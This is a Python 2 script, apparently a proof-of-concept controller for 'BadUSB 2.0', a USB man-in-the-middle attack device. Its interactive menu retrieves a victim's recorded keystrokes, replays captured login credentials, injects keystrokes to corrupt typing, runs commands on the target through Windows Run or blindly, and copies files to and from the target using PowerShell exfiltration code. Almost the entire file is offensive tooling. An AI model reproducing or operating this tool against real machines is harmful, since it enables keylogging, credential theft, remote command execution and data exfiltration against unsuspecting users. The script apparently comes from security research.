#!/usr/bin/env python

# BadUSB 2.0 by DK 2016 (@withdk)

import os
import sys
from shutil import copyfile

# Eye candy!!!!! :))) 

print('''
 ******                  ** **     **  ******** ******          ****      **** 
/*////**                /**/**    /** **////// /*////**        */// *    *///**
/*   /**   ******       /**/**    /**/**       /*   /**       /    /*   /*  */*
/******   //////**   ******/**    /**/*********/******           ***    /* * /*
/*//// **  *******  **///**/**    /**////////**/*//// **        *//     /**  /*
/*    /** **////** /**  /**/**    /**       /**/*    /**       *      **/*   /*
/******* //********//******//*******  ******** /*******       /******/**/ **** 
///////   ////////  //////  ///////  ////////  ///////        ////// //  ////

	- BadUSB 2.0 USB MITM POC

''')
# Ascii art compliments of http://patorjk.com/software/taag/

shell='$'
if os.geteuid()==0:
	shell='#'

keystrokefile='/tmp/badusb2-recorded'
replayfile='/tmp/replay'
modifyfile='/tmp/modify'
startrunfile='/tmp/startrun'
anyonehomefile='/tmp/capslock'
blindcmdfile='/tmp/cmd'
shellfile='/tmp/cmd2'

help=('''
BadUSB 2.0 Options Menu
	help - get help menu.
	keystrokes - retrieve user keystrokes.
	anyonehome - toggle capslock.
	replay - replay last user login.
	modify - toggle user annoyance mode. Every keycode sent gets decremented. 
	startrun - execute a command via Windows-Key/Run.
	cmd - execute a blind command (no output).
	getfile - copy a file from target.
	putfile - copy a file to target.
	exit - close program.
''')

opt=True
while opt:
	raw=raw_input('BadUSB 2' + shell + ' ')
	if(raw=='help'):
		print help
	elif(raw=='keystrokes'):
		print 'Getting keystrokes...'
		for line in (open(keystrokefile).readlines()):
			print line.rstrip()
	elif(raw=='anyonehome'):
		print 'Anyone home!??'
		open(anyonehomefile,'a').close()
	elif(raw=='replay'):
		print 'Replaying login credentials...'
		open(replayfile,'a').close()
	elif(raw=='modify'):
		if not (os.path.isfile(modifyfile)):
			print 'Annoying user by randomly flipping characters...'
			open(modifyfile,'a').close()
		else:
			print 'stopping the modify attack.'
			os.remove(modifyfile)
	elif(raw=='startrun'):
		print 'Start/Run executing...'
		open(startrunfile,'a').close()
	elif(raw=='cmd'):
		print 'Sending command...'
		open(blindcmdfile,'a').close()
	elif(raw=='getfile'):
		print 'This requires you to have copied over powershell exfil code.'
		print 'Example: g(\'o.txt\')'
		print 'Attempting to download a file...'
		open(shellfile,'a').close()
	elif(raw=='putfile'):
		file=raw_input("Enter filename to copy: ");
		print 'Attempting to copy file ' + str(file)
		try:
			copyfile(file, '/tmp/badusb2-copyme')
		except:
			print "Failed to access file"
			pass
	elif(raw=='exit'):
		opt=False

